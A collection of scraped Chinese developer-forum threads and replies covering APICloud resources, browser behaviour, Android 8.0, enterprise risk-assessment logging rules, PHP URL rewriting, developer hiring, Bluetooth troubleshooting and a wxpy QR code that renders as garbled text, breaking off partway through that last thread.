{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>APICloud 专注于 APP 开发定制技术，多年来不停为开发者奉献更多的资源。此次， APICloud 将以往的的资源进行更新、整合，以合集的形式分享给广大的用户。</p>\n<h3><strong>APICloud 应用案例源码合集</strong></h3>\n<p>APICloud 应用案例源码合集，收集一些优秀的基于 APICloud 技术开发的应用模板。其中包括仿每日优鲜应用模板、仿大众点评应用模板、仿今日头条应用模板等 14 个知名热门案例的应用模板。</p>\n<p><a href=\"https://github.com/apicloudcom/APICloud-App-Templates\" rel=\"nofollow\">https://github.com/apicloudcom/APICloud-App-Templates</a></p>\n<h3><strong>APICloud 认证考试往期实例 App 源码合集</strong></h3>\n<p>APICloud 认证考试往期实例 App 源码合集，本集合内集成了 APICloud 的认证考试考前资源和演示 Demo 的源码，供开发者参考学习。本集合会跟随 APICloud 的认证考试进行持续更新。</p>\n<p><a href=\"https://github.com/apicloudcom/APICloud-Certification-Cases\" rel=\"nofollow\">https://github.com/apicloudcom/APICloud-Certification-Cases</a></p>\n<h3><strong>APICloud 扩展模块使用的示例代码合集</strong></h3>\n<p>APICloud 集成了扩展模块的实际使用示例源码,供开发者参考学习如何在项目中调起使用 APICloud 模块，在这个合集中包括界面布局类、导航菜单类、功能扩展类等 11 个扩展模块。本集合还会持续更新。</p>\n<p><a href=\"https://github.com/apicloudcom/APICloud-Module-Examples\" rel=\"nofollow\">https://github.com/apicloudcom/APICloud-Module-Examples</a></p>\n<h3><strong>APICloud 七天在线培训课教程</strong></h3>\n<p>以一个每日优鲜 APP 项目开发为主线，按照 APP 开发的标准流程一步步来讲解，如何从 0 开始开发一款 APP 。从需求梳理开始，包括：需求分析、架构设计、界面布局、功能分解、服务对接、接口联调、编码规范、性能优化、发布更新等等。希望大家可以通过整个课程了解一个标准 APP 全生命周期的开发流程。</p>\n<p><a href=\"https://github.com/apicloudcom/APICloud-7Days-Online-Training-Tutorials\" rel=\"nofollow\">https://github.com/apicloudcom/APICloud-7Days-Online-Training-Tutorials</a></p>\n<h3><strong>APICloud 扩展模块源码合集</strong></h3>\n<p>APICloud 扩展模块源码合集（内含 iOS 和 Android ），收集一些遵循 APICloud 模块扩展机制开发的 APICloud 扩展模块源码，包括官方模块和个人开发者的模块。其中包括界面布局类、导航菜单类、功能扩展类、设备访问类、开放服务类等 16 个优秀模块。</p>\n<p><a href=\"https://github.com/apicloudcom/APICloud-Modules\" rel=\"nofollow\">https://github.com/apicloudcom/APICloud-Modules</a></p>\n<h3><strong>APICloud 开发工具及插件源码合集</strong></h3>\n<p>APICloud 所支持的开发工具包括 Sublime Text 、 Atom 、 APICloud Studio 、 Webstorm 、 CLI 命令行等，本合集还涵盖了 APICloud 工具核心库、脚手架工具和 VSCode 语法提示等插件。</p>\n<p><a href=\"https://github.com/apicloudcom/APICloud-DevTools\" rel=\"nofollow\">https://github.com/apicloudcom/APICloud-DevTools</a></p>\n</div></div>"], "reply": "2", "tittle": "APICloud 案例源码、模块源码、考试源码、开发工具大集合！赶快收藏", "comment": ["额。。。没人收藏", "以前用 apicloud 做过一个项目"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>6 plus 用 iOS chrome 浏览网页，经常要返回按钮，但是这个 chrome 的返回按钮在左上方，右滑返回也必须从最左边开始滑动，大拇指根本够不着，只能使用左手，难道 iOS chrome 的 pm 是个左撇子？为什么故意要设计得这么难用？</p>\n</div></div>"], "reply": "28", "tittle": "ios chrome 为什么要设计成左撇子用的？", "comment": ["safari 在 iOS 上比 chrome 好用 1000 倍，为什么要装 chrome?", "实际上 iOS 返回操作必须从左边开始划，否则你怎么区分返回和页面内滑动？\r", "\r", "按钮放天上仍然是小屏幕时代的遗毒，这个世界需要下巴。", " “ iOS 返回操作必须从左边开始划，否则你怎么区分返回和页面内滑动”这个技术难题被 UC 攻克了， UC 技术比 Google 强", "6S 感觉够得着。我认为重点在于 Plus 不适合单手操作。", " 系统应用全都是侧滑返回的，不过很多 app 并没有根据 apple 的来，会全屏返回，改写动画等等，震惊， uc 竟然超越 google 实现了全屏返回...", "iOS 版的 Chrome 什么时候才能支持 chrome://flags/#enable-chrome-home ，屏幕越来越大，把地址栏放在底端操作起来更方便。", "震惊！用 iOS 还会对左上角返回不习惯？？ iOS 大把的应用是左上角返回的啊，不是这样的才是少数好不好。", "我是右撇子，可是我用手机都是左手……", "同上。我不是左撇子，但是大部分时间是用左手玩手机。", "同上…", "那是你手机的尺寸问题。 6plus 本来就不是设计一只手用的，右手拿手机，左手按返回不是正好吗？", " safari 在一起 iOS 上比 chrome 难用一千倍，我经常要在新标签里打开网页，用 Safari 的体验简直了。", "😒我说 iPhone 用用大拇指点返回按钮怎么那么费劲，曾经还一度怀疑是不是我的手指太短了，原来这个是设计成给左手用的啊", "我是右撇子 但是用左手玩手机，打字用右手配合左手", " 乱讲。", "chrome 致命缺点 不能加载 content blocker. 不知道你们怎么忍得了?", "微微一笑，深藏功与名（来自左手操作的左撇子的凝视", "iOS 是这样的，就算是 safari ，也是需要边缘右滑返回，这是 Apple 的设计。\r", "主要还是 plus 出现后，注定就没办法单手操作了，当年 job 都说了手机就该单手操作，但现在...", "是指右手拿 Plus ，大拇指从屏幕左侧（非顶部）向右滑动返回没办法或者很困难吗？真这样手小的话不应该买 Plus 或者双手持机啊，否则除了浏览器外那么多需要右滑返回的地方不是都很难过？", "的确是设计的左手操作手机，右手可以做其他事情，比如记录之类的", "楼主这个需求，其实越狱就可以解决了。 activator 直接设定手指向右滑出屏幕，动作为“返回”或者“程序内返回”。这样你用任何 iOS 软件，右手持机，例如微信，拇指向右滑出屏幕，就会执行返回，非常方便。", "全屏返回相对而言更容易误操作，到时候又要抱怨。除非屏幕太大了，单手够不到左边缘，否则就是习惯没习惯的区别。", " 直从电脑装了 UC 浏览器，右下角天天弹一个正方形的广告图。还没标注是 UC 的，简直流氓极了。我浏览器都没启动你凭什么给我弹。", " UC 的 iOS 水平比 Google 的 iOS 水平高,毫无违和感- -", " 因为 UC 的 iOS 水平比 Google 的 iOS 水平高\r", "当然了，毕竟天天震惊，天天广告，天天推送", "之前一直用 Chrome 一直觉得不爽 后来换了个 Firefox 好多了\r", "至于国产浏览器,坚决不用", "从左边右滑返回觉得一点毛病没有啊。。。", "UC 浏览器有毒"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天用 webstorm debug node 代码，主要流程就是 Safari 访问一个带参数的连接，然后向数据库里插入一条记录\n假如链接为： http://localhost:3000?name=1001 ， Safari 里输入连接然后敲下回车，就将 1001 写入数据库。\n发现的问题就是当我在输入 name 值的时候，如果 Safari 的历史记录里存在对应的或者是模糊匹配到的话， Safari 会触发请求这个匹配到的连接的操作。\n也就是说假如我的 Safari 有如下历史记录</p>\n<pre><code>http://localhost:3000?name=1002\nhttp://localhost:3000?name=1003\nhttp://localhost:3000?name=1004\n</code></pre>\n<p>我打开 Safari 当我输入到 http://localhost:3000?name=1 它如果优先匹配到 1001 的话，就直接会将 1001 写入数据。\n我换了 Chrome 则没有这样的情况，换了 vscode+Safari 或者 终端+Safari 也是同样的问题。\n不知道我描述清楚没，大家有这样的情况吗？\n另外排除了 favicon.ico 的请求，和这个无关。</p>\n</div></div>"], "reply": "12", "tittle": "发现 Safari 一个 bug（不知道是 feature 还是 bug）", "comment": ["是的， Safari 是有这个 “模糊匹配” 并默认选上的 feature ，一旦回车直接进入模糊匹配的那个 URL ；\r", "用 iOS 原生输入法，在模糊匹配之后可以删掉后面部分，\r", "但如果用的是第三方输入法（例如搜狗）是删不掉的，只会是选中状态，要输入其它的字符或空格来替换地址栏的内容", "最简单的办法其实是 不要用 get 请求处理写入", "safari 偏好设置——搜索——在后台载入“最常点选”\r", "\r", "GET 请求应该是幂等的", "chrome 一样有这个问题，这是是浏览器 prediction 优化特性，会提前加载他认为最匹配的 url ，所以在你敲下去之前其实浏览器就已经把这个页面加载好了，这样你一敲这个网页就出来了", "输入时匹配到的第一条会预加载，按下回车之后便直接呈现已经下载完成的页面", "这个真的是 feature...", "改用 POST 请求", "这个坑我必须说一下！！！\r", "\r", "有个给用户发奖金的操作，因为很少用，所以我一般是写一个接口然后丢上生产环境访问触发一下；然而有一天，我发现给用户发了 2 笔，但我只访问了接口一次，后来测试之后才发现， safari 读出历史记录之后，会在我回车之前，请求一次。。。\r", "\r", "钱的教训~", "谢谢各位大佬的回答", "预加载吧……重点是你为什么用 GET 请求写数据", "Chrome 也会预加载.", " 确实不应该用 get ，我测个东西为了方便所以就 get 了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>谷歌将于 5 月在 2017 I/O 开发者大会上发布最新的 Android 8.0 系统，今年 3 月发布 Android 新系统开发者预览版时已给新系统取名为 Android O 。那备受开发者关注的 Android O 有哪些新特性值得开发者关注呢？</p>\n<p><a href=\"https://www.qcloud.com/community/article/875259?fromSource=gwzcw.92972.92972.92972\" rel=\"nofollow\">开发者必看｜ Android 8.0 新特性及开发指南</a></p>\n</div></div>"], "reply": "20", "tittle": "开发者必看｜ Android 8.0 新特性及开发指南", "comment": ["每次吹牛逼说省电，麻痹每次都更耗电，然后就再也不想 Android.", " 最新的原生 android  + 常用的良心 app 感觉体验还不错啊。", " 国内大部分手机还是 4.X 或者 6.0.1 的系统，用 7 的都寥寥无几吧", " #1 就像 iOS 每次说更流畅一样？", "然而新特性都是防君子不防小人...", " 国产手机旗舰基本都 7 了", "我来说个笑...额好话\r", "iOS 每次更新都更流畅", "说个笑话：腾讯讲 android 新特性", "哈哈哈。", "  百度阿里的 android 也是无敌流氓,", "android 开发坑太多，我更愿意写 ios", "还在等 7.0 推送", "2333", " iOS 的流畅早就登峰造极了，升级就是为了降流畅逼用户换手机了， Android 这个明显是心有余而力不足，二者并不是一个层次的问题。", "爱范儿：虽然 iPhone 每年都会传出很多激进的设计，但苹果却并没有如我们所愿去采用，因为苹果对用户体验的注重还是要大于对新技术的一味追求，这也是为什么我们会看到 iPhone 可以历经三代而没有什么大变化，但用户体验上却仍然另大多数用户满意的原因。", "如何保持后台……", "然而腾讯有遵循安卓规范的软件吗？", "半年到一年的硬件优势，这是苹果流畅度的保证。", "如何让 service 不死都快成找工作必考题了", "qq 用的还在兼容 android2.2 吧"]},
{"content": ["<div class=\"topic_content\">最近准备启动企业风险控制方面的系统，主要是安全方面的，但是对风险控制这块不太懂，有没有了解的大侠，求指点一二。\r<br>我觉得应该 涉及 硬件资产、数据资产、产品安全管控什么的。\r<br>有经验的同学，指点指点啊</div>"], "reply": "3", "tittle": "互联网企业风险控制都有哪些内容", "comment": ["还有人啊？", "座标广东深圳. 要做安全风险评估.\r", "广东这边获得安全风险评估资质的就 3 家: 总名单在这里 ", "\r", "我们要做 2 级评测, 这是我从评测公司那边拿到的要准备的信息\r", "业务日志: 应包含如下：\r", "业务日志包括：用户登录、注册、修改登录密码、找回登录密码、修改交易密码、找回交易密码、注销、绑定／修改个人认证信息（身份证、银行卡、手机号码、邮件）、交易记录（订单记录、投资记录）等。\r", "\t后台管理的日志必须包含除查询外的所有日志（覆盖以下内容：登录、修改密码、修改用户信息、发标等）\r", "业务日志的格式：用户名／管理员 ID 、时间、 IP 、操作模块、动作、结果（成功、失败、异常）、备注等\r", "业务日志中不能包含敏感信息（如有，必须模糊处理），保留期限需大于 180 天，需要以 web 页面的形式展示，可以根据对应的用户名／管理员 ID ，时间、操作模块、结果等进行组合搜索\r", "业务日志存储位置：\r", "\t文件：需限制只能写入和读取，并且除指定账号外，其它账号不能访问\r", "\t数据库：需设置权限只有读取和插入\r", "业务日志和非法关键字过滤系统的账号给管局外部访问用。（给通管局查询", "企业风险控制和互联网风险控制不太一样吧"]},
{"content": ["<div class=\"topic_content\">这几天看下 php ，发现 url 需要在 nginx 下重写规则（叫伪静态？不太懂），才能实现类似 python | ruby 下的 <a target=\"_blank\" href=\"http://www.abc/list/1\" rel=\"nofollow\">www.abc/list/1</a> 这样直观的 url 表现形式，而 python|ruby 下写 web ，直接就是直观的 url 表现形式，没有什么规则重写。请教下大家，这是什么原因，谢谢。</div>"], "reply": "9", "tittle": "为什么 PHP 写 web， url 需要重写规则？", "comment": ["很简单啊，因为 PHP 自带一个 router 的实现，这个 router 实现的比较难用（ url 直接对应到文件）。所以大家想用自定义 router 替代自带的 router 的话，首先就得把自带的 router 效果纠正过来，发送给自定义 router 。\r", "\r", "而 Python 和 Ruby 不像 PHP 一样本身就是一个简单的框架， HTTP 请求会直接发送给自定义 router 进行处理。", "为什么不用框架", " 框架同样需要重写规则吧?看 laravel ，也是需要的，不过我对 php 不熟悉，不太清楚。", "最早的 web 就是一个 URL 对应一个文件\r", "后来有了动态页面，从 cgi 到 asp 到 php ，也都是这个套路，一个 URL 还是对应的磁盘上的一个文件去处理它，只不过实际内容是程序输出的\r", "然而现在有人觉得这样丑，不够高大上，没有逼格（好好好，我知道你们的借口是不方便开发，不够 MVC ）\r", "那怎么办， fastcgi 表示我只管调用 php 不关我事啊， nginx 说 rewrite 吧，把所有找不到文件的请求都 rewrite 到一个 php 文件上，后面还是原来的处理逻辑，那个 php 文件再判断到底是要干啥\r", "\r", "同样坑爹的还有 pathinfo ，谁特么想出来的这馊主意", "PHP 前面有一个 webserver", "某种角度来说，这是 php 的坑之一。\r", "\r", "合理的文件布局和 Nginx 可以避免一部分这个坑点。", "python 这种本来不是为 web 设计的语言，因为有网络能力，于是有人做了 http 库，语言内实现了 http 服务，也就是 nginx 的基本功能，既然是自己实现的，一来是想怎么搞就怎么搞，二来是本身语言内没有文件概念，所有的请求都没有对应的文件，必需要对请求的 URL 做路由处理", "学习 CGI 模型去……", "一般这么做是为了隐藏 index.php ，和做 MVC 吧。\r", "apache 读取到 http 头里的路径信息，然后首先添加上 index.php 作为统一入口交给 php 进行处理，然后 php 框架（如 CI ）获取到 controller 和对应的 method 后，去找这个类并进行处理。"]},
{"content": ["<div class=\"topic_content\">到了新公司一个多月了。通过各种渠道推送了一些招聘信息，也过来很多简历，无奈公司做 toB 业务，市场上没什么名气。过来的简历也大多是大专甚至更惨的。\r<br>\r<br>几年前我在果壳网带团队时，招聘还是很容易的。大把的小鲜肉，挑选一些培养起来。在我帮助下，一个个成长的也都不错。可现在的状况就很尴尬了。我倒是不在意学历如何，事实上以前果壳网时期找的小朋友里，大学退学的，大专的，挂科延期拿学位的都有。但至少他们各自有自己的亮点，比如早已有过自己的一些编程实践。而现在收到的几乎所有简历，那可真是看得出是完全不喜欢学习的人。\r<br>\r<br>这十多年连续的扩招，每年毕业的学生也挺多的。但招聘形势是真的不一样了。 985/211 的基本上进入大四就全都预定好了，剩余的大多毕业后也未必找得到。</div>"], "reply": "78", "tittle": "求职与招聘都不易", "comment": ["公司没名气确实不好招，收到的简历 都是海投的那种。。。", "的确，怎么招都招不到人，想找好的工程师，有兴趣的了解官网站，来拉钩投简历  ", "我在小公司做了 1 年多，当了蛮久的 leader 了\r", "根本招不到靠谱的人。人家投都不投。所以产品开展不下去，我自己都要闪了。", "现在正在找工作中楼主公司成都的么。", " 没名气的小公司，很难招人的，符合行情的待遇， 100 个投简历的，有二十来个能入眼，预约好大概有一半样子要爽约不来，面试通过的不到 5 个，最后多半还不愿意来", "同样的囧境，唉，好难招", "哎。。还有来了半个月又跑掉的。。毫无征兆的跑掉。。", "我是老鲜肉了。知识结构就是 linux 系统比较熟 shell 比较熟 C 比较熟 高性能网络编程比较熟 然后懂些协议， html css js 这些前端的东西知道一些。 PHP 基本忘干净了， java python golang 都不会。也有 bat 工作经验，但找工作就没有太合适的。", "拿钱砸，找猎头\r", "只给平均薪资当然没人去", "能说一下公司名或者招聘链接吗，不一定合适，但也想试试机会", " 我之前招了个前端。然后人家最终也爽约没来。\r", "我觉得如果你们那儿保险齐全、价格适中的话，应该不至于招不到吧。\r", "我们这儿是程序员就 2-3 个人。人家一看着规模根本不会来。然后不买公积金，保险全部买最低标准。等等。", "两方都不肯降低标准，只能这样。", " 公积金都不买，肯定不是一般的抠啊。", "word 天！居然发现小明同学。赶紧手一哆嗦关注下。", "嗯。我 211 硕士啊，没被预定啊 （学渣小跑", " 我们好歹十几个开发，公积金社保齐全，虽然避税，但是到手就多了啊。 1-3 年的初级 Java 开发，只需要会写增删改查和管理界面，其它都不 care ，到手 8-12K ，我个人觉得还是匹配的。面试时，讲得清 AJAX 是异步，能说出前后台传 JSON 格式数据的，基本上都要了。", " 我的天,这样都开 8-12k,你们公司在哪?", "公司在哪儿? 在不在北京", "信息不对称，所以才有了 HR (中介)。", " 求个联系方式，投简历  java 后端 linux 玩的可以 人在上海 有意给个邮箱地址", "看 LZ 说的，似乎只是想找应届生？", "我觉得我司还好。。。也是小 p 公司。。", " #11 这待遇招不到人，也没什么好吐槽的吧", " 你做哪块的？", " 求个联系方式，意向 web 前端", "这招聘贴不错", "主要还是在的公司不同所以招聘难度不同吧", "大专咋的，瞧不起？垃圾", "得用高工资，重赏之下必有勇夫！", " lz 没有瞧不起大专。不看贴？", "招聘的说难找 找工作的说难找工作", "话说， lz 我为什么觉得找工作很难呢？到现在都没找到特别合适的。。。", "所以要看公司就是要个不爱学习的码农还是要聪明的程序员啦……当然这些是可以用钱解决的，再聪明爱学习，工资要的高也不行啊", "之前楼主不是在格灵深瞳", " 这样都 8-12K 看似不错，但是比这好的，也不需要，除了三四个持股的骨干是 senior ，其它都只要初级", "工作真心难找，我有时候都怀疑那些企业是不是诚心想招人。", "楼主敲着不在意学历，不过话里说的倒是挺老实的。😂", "还没找到工作的路过😂开发岗位的要求动不动就是多少多少年经验，只在平时作业和现在在弄的毕设编过程序的水平根本不敢投", "培训出来的太多了，市场被搞乱了", "被各种大大小小公司以传统行业缺乏互联网经验刷简历、一轮游\r", "能谈 offer 的又都拿之前十八线城市的起薪来压价格\r", "一失足成千古恨", "去年找工作，今年就招聘，主要是公司标准定的高，还只愿意给个平均工资，有的甚至平均工资都没有！资方和劳动者都在犯错，这个市场出了问题", "然而果壳好像并不太想招人", " 垃圾被发现了...", "有南京的坑不", "楼主的公司在哪儿？", "找工作难和招聘难自然会同时存在。劳方和资方的要求不同。\r", "\r", "一般中小公司都想找什么都会，来了就能干活，要钱不太高，任劳任怨的全能劳工，能够最大程度给公司或集体带来利益与价值的人。但是有技术能力的人要么自己干了，要么待在大公司。\r", "\r", "一部分求职者也对工作岗位有要求，一般都倾向于找最大程度给自己带来利益与价值的工作岗位。地位不高，没太多发展，给钱也不多，工作强度还大，要加班的，自然不愿意来。", " 这样也行？？", " 你急了 哈哈", " 哈，这句说得好", " 现在小鲜肉正好和你相反，底层原理和协议不太懂，但是各种框架玩得很 6", "哎呀 小明", " 我擦，要求这么低都给 12k ，这是在北上广深么？", " 详细的给个？", "是啊，都不容易，曾经求职约好面试时间了被 HR 放鸽子， 2333 。", "只能说做好自己该做的事情吧，岂能尽如人意，但求无愧我心。", "我觉得有一半的原因在于 HR 筛选简历上面。他们希望以低薪资招到高水准的员工，这本身就是一个很矛盾的行为。特别鄙视一些招技术岗还以工作年限为硬性要求的。", " 像前端的 bootstrap vue.js 看两天还是能玩起来的。\r", "还有很多自己积累的框架，出活也不慢。\r", "但外面相关的职位不多，现在只能守着现在这个工资不算太高，也不累的岗位。然后同时干几个兼职，勉强糊口。", " 看到两个人说小明了，好奇地请问下小明是谁，楼主吗？", " 问楼主呗", "培训班：怪我咯？", "求职的不容易，招聘的不容易，所以这个社会容易的到底是谁", " 还缺人吗", "找靠谱的人哪里都一样难，很多公司不关注除了职业技能之外的能力，比如沟通能力、品德、强烈的责任心等，这些软技能才是一个人是否靠谱的关键， python 、 spring 等不会可以学，但是如果品德不行，招进来也靠不住", " 我去，这么简单的要求  我也能去啊  虽然我是才写 java 半年 之前是写前端的", "最烦那种因为程序员钱多才干这行的，", " 说的我都想转 Java 了。你们在哪招人啊", "  这是在哪儿啊", " 上海啊，所以招不到", " 还真瞧不起", " ＂这样都 8-12K 看似不错，但是比这好的，也不需要，除了三四个持股的骨干是 senior ，其它都只要初级＂\r", "\r", "这种没有上升空间的留不住人吧？", " 上升空间是没有的，但是不加班，偶尔公司还会把比较赶时间的项目外包给他们当私活", " 哥哥你们那还招 java 么！求个邮箱投简历！", " \r", "算下来初级 13K? 要求好实在，我就想问问，招兼职么？", "初级给 8-12 .....\r", "原来我混了这么久，还在初级. . . . .", "我就是大专，学得 python ，如果需要 python 我可以投一下我的简历，感谢", "杭州应届生，找 java 实习两月了。校招上瞄了几眼别人的简历，好多培训班， hr 也不高兴找我这野路子。偶尔一两个面试，还爱来不来的样子。大哥我找个 2-3K 的实习也太难了吧", " 就你也配？狗篮子", " 看来不只是没智商，爹妈还没教育好", " 同问你们公司在哪，招聘我的人连问到 vue 的小细节， BFC 都问"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近入手了漫步者 W290BT 蓝牙 4.1 耳机，耳机连接手机是没有问题。耳机但是无法连接笔电，特征是笔电正确打开了蓝牙后，无法搜到耳机。但是笔电可以搜到并连接到手机。</p>\n<p>笔记本是索尼的 SVF1521V3CW 笔电， VAIO 被卖了大家应该都知道的吧，所以官方不再支持。这笔电的网卡是 <strong>Broadcom BCM43142 802.11b/g/n Wireless Network Adapter</strong> ，支持 Bluetooth4.0 ，最新的驱动是 2015.3.25 的版本，按道理是能被耳机的蓝牙 4.1 向下兼容的，系统是自带的 OEM Windows8 系统升级成的 Windows10 home 1511 。</p>\n<p>我确保我是正确地打开了蓝牙。一开始我以为是驱动问题，把设备管理器 - 蓝牙里的驱动删掉后，扫描硬件更改时驱动又被秒装回去，这是什么原理？在设备驱动程序列表中看到适合的驱动就一个，叫 BCM43142 Bluetooth Adapter ，连 Windows 检查更新也没有更新的版本，在谷歌、微软、博通官网也找不到更新的通用驱动。但是能够正常连接电脑，可是这耳机看上去没问题啊。</p>\n<p>没试过折腾 Windows10 的笔记本蓝牙，网上搜索无果，但是看到 Windows10 的蓝牙很多都出了问题，淘宝卖蓝牙适配器的店家也不保证能百分百适配。所以很想请教大家，有哪些方法可以排查 / 解决这个问题？</p>\n</div></div>"], "reply": "2", "tittle": "Windows10 笔记本的蓝牙无法工作，有哪些方法可以排查/解决问题呢？", "comment": ["在低版本 Windows 上试能否连接耳机，或者断开耳机和其他设备的连接，然后进配对模式让笔记本搜索设备。\r", "在重装一次之后我的笔记本蓝牙使用正常了（英特尔家， wu 驱动），最后再检查一下设备兼容性是不是有问题。", "似乎是因为你笔记本上蓝牙设置为其他人无法发现。我买 QC35 的时候也遇到过这个问题 搜了一下改下设置久解决了"]},
{"content": ["<div class=\"topic_content\">我在用 wxpy 微信机器人， github.com/youfou/wxpy\r<br>现在群里很多人遇到一个问题，就是运行之后，会在 terminal 里， 例如 xshell 里，显示出二维码\r<br>\r<br>现在的问题是，有时这个二维码就 OK ，可以扫描，有的人的系统就出来一堆 M ，扫描不了\r<br>\r<br>我两种情况都遇到过\r<br>\r<br>今天突然变成一堆 M 。\r<br>\r<br>似乎是Linux的编码问题，因为有人用Centos不行，有人用Ubuntu就好了\r<br>但我用Ubuntu，不行\r<br>请问有了解情况的大侠么？谢谢\r<br>说是安装 Pillow ，折腾半天，安装不了。\r<br>\r<br>\r<br>最关键的问题是，我google都不知道用什么关键词，一搜，全都是介绍怎么生成QR的\r<br>\r<br>\r<br>如果出现一堆 M ，出现一堆下面这样：\r<br>\r<br>MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\r<br>MMMM              MMMMMMMM      MMMM    MMMMMMMMMMMM    MMMM  MMMMMMMM  MMMM  MMMMMMMMMMMM              MMMM\r<br>MMMM  MMMMMMMMMMMMMMMMMMMM  MMMMMMMM  MMMMMMMMMMMM  MMMMMMMMMMMMMMMMMMMM        MMMMMMMM  MMMMMMMMMMMMMMMM  MMMMMMMMMMMMMMMMMMMM  MMMM\r<br>MMMM  MMMM      MMMM  MMMM      MMMM    MMMM    MMMM      MMMMMMMMMMMMMMMM  MMMM    MMMM  MMMM      MMMM  MMMM\r<br>MMMM  MMMM      MMMM  MMMM  MMMM    MMMMMMMMMMMM  MMMM  MMMMMMMM  MMMMMMMMMMMMMMMM        MMMM  MMMM      MMMM  MMMM\r<br>MMMM  MMMM      MMMM  MMMMMMMM  MMMM  MMMM    MMMM  MMMM  MMMMMMMM  MMMM  MMMM    MMMMMMMMMMMM  MMMM      MMMM  MMMM\r<br>MMMM  MMMMMMMMMMMMMMMMMMMM  MMMMMMMMMMMM  MMMMMMMMMMMM    MMMM  MMMMMMMMMMMMMMMM    MMMMMMMM  MMMMMMMMMMMM  MMMMMMMMMMMMMMMMMMMM  MMMM\r<br>MMMM              MMMM  MMMM  MMMM  MMMM  MMMM  MMMM  MMMM  MMMM  MMMM  MMMM  MMMM  MMMM              MMMM\r<br>MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  MMMMMMMM  MMMM      MMMMMMMMMMMM  MMMMMMMMMMMM    MMMM    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\r<br>MMMMMMMMMMMMMMMM    MMMM    MMMM      MMMM  MMMMMMMM  MMMMMMMMMMMMMMMM  MMMM    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    MMMMMMMMMMMM\r<br>MMMMMMMM      MMMM  MMMM      MMMMMMMMMMMMMMMMMMMM  MMMMMMMMMMMMMMMM    MMMMMMMM    MMMM      MMMM    MMMMMMMM  MMMMMMMM\r<br>MMMMMMMM  MMMM  MMMMMMMM  MMMM  MMMMMMMM    MMMM  MMMM      MMMMMMMM    MMMMMMMM  MMMM              MMMMMMMM  MMMM\r<br>MMMMMMMM  MMMMMMMMMMMMMMMMMMMM  MMMM  MMMM  MMMM  MMMM    MMMM    MMMM  MMMM    MMMM    MMMM    MMMM      MMMM  MMMM\r<br>MMMM  MMMM  MMMMMMMM              MMMMMMMMMMMMMMMMMMMMMMMM      MMMMMMMMMMMM  MMMMMMMM    MMMM    MMMM  MMMM    MMMM\r<br>MMMMMMMMMMMMMMMMMMMM  MMMMMMMM      MMMM      MMMM    MMMMMMMM    MMMM      MMMM        MMMMMMMM  MMMM  MMMMMMMMMMMM\r<br>MMMMMMMMMMMMMMMM          MMMM  MMMM  MMMMMMMM  MMMMMMMMMMMMMMMMMMMM    MMMMMMMM    MMMM  MMMM    MMMM          MMMM\r<br>MMMM  MMMMMMMM  MMMM  MMMMMMMM  MMMM  MMMM  MMMMMMMM  MMMM  MMMMMMMM  MMMM      MMMMMMMM  MMMM  MMMMMMMM        MMMMMMMM\r<br>MMMMMMMMMMMM      MMMM    MMMMMMMM  MMMM        MMMMMMMM  MMMMMMMM      MMMM  MMMMMMMM  MMMM    MMMMMMMM  MMMM  MMMM\r<br>MMMMMMMM      MMMMMMMMMMMM          MMMM      MMMMMMMMMMMM  MMMM  MMMM      MMMM  MMMM  MMMM  MMMMMMMMMMMM  MMMMMMMM\r<br>MMMM  MMMM  MMMM  MMMM  MMMM    MMMM  MMMMMMMM    MMMM      MMMM  MMMMMMMM  MMMMMMMM  MMMMMMMMMMMM  MMMMMMMM  MMMM  MMMM\r<br>MMMM  MMMMMMMM  MMMMMMMMMMMM  MMMM  MMMMMMMM    MMMM  MMMM    MMMM  MMMMMMMMMMMM    MMMMMMMMMMMM  MMMMMMMMMMMM  MMMMMMMMMMMMMMMM\r<br>MMMMMMMM  MMMM  MMMM            MMMM    MMMM    MMMMMMMM            MMMM  MMMM      MMMM    MMMMMMMMMMMMMMMM\r<br>MMMMMMMM  MMMMMMMMMMMMMMMMMMMMMMMM        MMMM  MMMM    MMMMMMMM    MMMM  MMMM          MMMMMMMM    MMMM      MMMM\r<br>MMMMMMMM    MMMM  MMMM  MMMM    MMMM    MMMM    MMMMMMMMMMMM  MMMM  MMMMMMMM  MMMMMMMM  MMMM    MMMM  MMMMMMMMMMMM  MMMM\r<br>MMMM            MMMM  MMMM  MMMMMMMM  MMMM      MMMMMMMMMMMM  MMMM      MMMM            MMMMMMMM  MMMMMMMMMMMM\r<br>MMMMMMMMMMMM  MMMMMMMM      MMMMMMMMMMMM        MMMMMMMMMMMM      MMMMMMMMMMMMMMMM    MMMM  MMMM  MMMM    MMMM  MMMMMMMM\r<br>MMMM      MMMMMMMMMMMMMMMMMMMM        MMMMMMMM  MMMM  MMMMMMMM      MMMMMMMM  MMMM      MMMMMMMMMMMM        MMMMMMMM\r<br>MMMM        MMMM      MMMM    MMMMMMMM  MMMMMMMMMMMMMMMMMMMM    MMMM  MMMMMMMM      MMMMMMMM      MMMM      MMMM\r<br>MMMM  MMMM        MMMMMMMMMMMMMMMM  MMMM  MMMMMMMM  MMMMMMMM  MMMMMMMM    MMMM  MMMM        MMMMMMMMMMMM    MMMMMMMMMMMM\r<br>MMMM  MMMMMMMMMMMMMMMMMMMM      MMMMMMMM  MMMMMMMM  MMMMMMMMMMMM      MMMM        MMMM                MMMMMMMMMMMM\r<br>MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    MMMM    MMMMMMMM    MMMM  MMMMMMMM  MMMMMMMMMMMM  MMMMMMMM  MMMMMMMMMMMM        MMMMMMMM\r<br>MMMM              MMMM  MMMMMMMM    MMMM      MMMMMMMMMMMMMMMMMMMMMMMM    MMMMMMMMMMMM  MMMM  MMMM      MMMM  MMMM\r<br>MMMM  MMMMMMMMMMMMMMMMMMMM  MMMMMMMM  MMMMMMMMMMMM    MMMMMMMMMMMMMMMMMMMMMMMM  MMMMMMMMMMMM    MMMM  MMMMMMMMMMMM    